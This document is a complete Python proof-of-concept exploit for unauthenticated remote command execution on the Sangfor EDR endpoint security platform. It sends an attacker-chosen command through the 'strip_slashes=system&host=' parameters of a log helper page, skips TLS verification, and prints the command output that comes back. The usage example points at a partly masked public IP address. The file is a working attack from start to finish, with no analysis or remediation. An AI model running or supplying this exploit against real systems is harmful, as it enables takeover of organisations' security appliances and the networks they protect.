#!/usr/bin/env python3
# SANGFOR_EDR_RCE PoC(深信服终端检测响应平台 RCE PoC)

import requests
import sys
import re

if len(sys.argv) < 3:
    print("""
    SANGFOR_EDR_RCE_PoC.py
    SANGFOR_EDR_RCE PoC(深信服终端检测响应平台 RCE PoC)
    usage:
        python3 SANGFOR_EDR_RCE_PoC.py <url> <command>
    e.g.
        python3 SANGFOR_EDR_RCE_PoC.py https://120.240.95.***:8443/ui/login.php whoami
    """)
else:
    url = sys.argv[1].split("/ui/")[0]
    cmd = sys.argv[2]
    payload = url + "/tool/log/c.php?strip_slashes=system&host=" + cmd
    print("\033[32m$ " + cmd +"\033[0m")
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(payload, timeout = 30, verify = False)
        match = re.findall('<p><b>Log Helper</b></p>(.*?)<pre>', response.text, re.S)
        for i in match:
            print("\033[34m" + i + "\033[0m")
    except:
        print("\033[31m[!] HTTP Error!\033[0m")